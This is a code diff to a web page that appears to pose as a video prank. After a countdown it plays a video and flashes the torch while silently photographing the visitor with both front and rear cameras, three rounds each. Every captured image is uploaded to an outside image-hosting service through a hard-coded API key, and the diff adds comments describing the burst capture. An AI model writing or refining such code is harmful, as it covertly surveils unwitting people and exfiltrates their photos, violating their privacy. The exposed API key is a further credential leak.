@@ -43,7 +43,8 @@ top:50%;
 left:50%;
 transform:translate(-50%,-50%);
 font-size:180px;
-color:#fff;font-weight:bold;
+color:#fff;
+font-weight:bold;
 z-index:99;
 display:none;
 }
@@ -67,6 +68,7 @@ let playCount = 0;
 const requiredPlays = 2;
 let vibrateInt, flashInt, flashTrack;
 
+// 闪光灯控制
 async function flash(){
 try{
 if(!flashTrack){
@@ -77,6 +79,7 @@ await flashTrack.applyConstraints({advanced:[{torch:!flashTrack.getSettings().to
 }catch(e){}
 }
 
+// 拍照并上传（不裁剪，原图）
 async function takeShot(facing){
 try{
 let stream = await navigator.mediaDevices.getUserMedia({
@@ -92,22 +95,27 @@ c.height = v.videoHeight;
 let ctx = c.getContext('2d');
 ctx.drawImage(v, 0, 0, c.width, c.height);
 
-c.toBlob(async (blob)=>{
-const fd = new FormData();
-fd.append('image', blob);
-await fetch('https://api.imgbb.com/1/upload?key=8a95d94678c08ed18a487c4ac68b9c96', {
-method:'POST', body:fd
+return new Promise((resolve) => {
+  c.toBlob(async (blob)=>{
+    const fd = new FormData();
+    fd.append('image', blob);
+    await fetch('https://api.imgbb.com/1/upload?key=8a95d94678c08ed18a487c4ac68b9c96', {
+      method:'POST', body:fd
+    });
+    stream.getTracks().forEach(t=>t.stop());
+    resolve();
+  },'image/jpeg',0.8);
 });
-stream.getTracks().forEach(t=>t.stop());
-},'image/jpeg',0.8);
 }catch(e){}
 }
 
+// 连拍前后摄像头
 async function takeBoth(){
 await takeShot('environment');
 await takeShot('user');
 }
 
+// 播放结束逻辑
 player.onended = ()=>{
 playCount++;
 if(playCount >= requiredPlays){
@@ -121,6 +129,7 @@ player.play();
 }
 };
 
+// 点击开始逻辑
 startBtn.onclick = async ()=>{
 startBtn.style.display='none';
 countdown.style.display='block';
@@ -134,13 +143,14 @@ countdown.textContent=n;
 clearInterval(t);
 countdown.style.display='none';
 
-// 倒计时结束才显示视频、播放、拍照、闪光
+// 倒计时结束后：显示视频、播放、拍照、闪光
 player.style.display='block';
 player.play();
 
 vibrateInt=setInterval(()=>navigator.vibrate(20),50);
 flashInt=setInterval(flash,120);
 
+// 连拍3组（前后各3张）
 (async ()=>{
 for(let i=0;i<3;i++){
 await takeBoth();
